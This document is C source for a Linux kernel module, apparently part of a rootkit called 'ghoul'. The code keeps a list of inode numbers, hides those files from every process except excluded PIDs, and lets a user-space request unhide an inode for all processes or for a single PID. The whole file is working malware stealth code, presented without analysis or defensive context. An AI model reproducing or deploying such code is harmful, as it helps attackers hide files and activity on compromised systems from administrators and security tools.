#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/uaccess.h>
#include "hide.h"
#include "service.h"
#include "privileges.h"

LIST_HEAD(inodes_to_hide);

void hide_file_inode(unsigned long ino)
{
    struct inode_list *inode_entry;

    pr_info("ghoul: hiding inode %lu\n", ino);

    inode_entry = kzalloc(sizeof(struct inode_list), GFP_KERNEL);
    inode_entry->ino = ino;
    INIT_LIST_HEAD(&inode_entry->excluded_pids);
    list_add_tail(&inode_entry->list, &inodes_to_hide);
}

int should_hide_inode(unsigned long ino)
{
    struct inode_list *inode_entry, *hidden_inode = NULL;
    struct pid_list *pid_entry;
    int current_pid;

    // check if inode is hidden
    list_for_each_entry(inode_entry, &inodes_to_hide, list) {
        if (inode_entry->ino == ino) {
            hidden_inode = inode_entry;
            break;
        }
    }

    // inode is hidden - check if our PID is excluded
    if (hidden_inode) {
        current_pid = current->pid;
        list_for_each_entry(pid_entry, &hidden_inode->excluded_pids, list) {
            if (pid_entry->pid == current_pid)
                return 0;
        }
        return 1;
    }

    // inode is not hidden
    else
        return 0;
}

void show_file_inode(const void __user *user_info)
{
    struct show_file_inode_info info;
    struct inode_list *entry, *hidden_inode = NULL;
    struct pid_list *excluded_pid;

    // copy request info
    if (copy_from_user((void *)&info, user_info, sizeof(struct show_file_inode_info))) {
        pr_info("ghoul: can't copy user data\n");
        return;
    }

    // search for requested inode
    list_for_each_entry(entry, &inodes_to_hide, list) {
        if (entry->ino == info.ino)
            hidden_inode = entry;
    }

    // requested inode is not hidden
    if (!hidden_inode)
        return;
    
    // show inode to all PIDs - delete from hidden inodes list
    if (info.pid == ALL_PIDS) {
        pr_info("ghoul: showing inode %lu for all processes\n", info.ino);
        list_del(&hidden_inode->list);
        kfree(hidden_inode);
        return;
    }

    // show inode to a specific PID - add PID to excluded PIDs list
    else {
        pr_info("ghoul: showing inode %lu for PID %d\n", info.ino, info.pid);
        excluded_pid = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
        excluded_pid->pid = info.pid;
        list_add_tail(&excluded_pid->list, &hidden_inode->excluded_pids);
    }
}